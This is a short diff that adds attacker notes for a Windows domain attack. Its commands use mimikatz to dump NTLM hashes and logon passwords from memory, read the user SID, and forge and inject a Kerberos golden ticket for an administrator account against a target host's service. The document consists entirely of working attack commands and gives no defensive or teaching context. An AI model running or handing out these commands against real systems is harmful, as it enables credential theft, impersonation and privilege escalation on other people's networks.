@@ -1,1 +1,9 @@
 
+#get NTLM
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+#get SID minus last 4digit user
+whoami /user
+#request golden ticket
+mimikatz # kerberos::golden /sid:<sid> /domain:<domain> /ptt /target:<host> /service:http /rc4:<NTLM> /user:<user_admin>
+klist
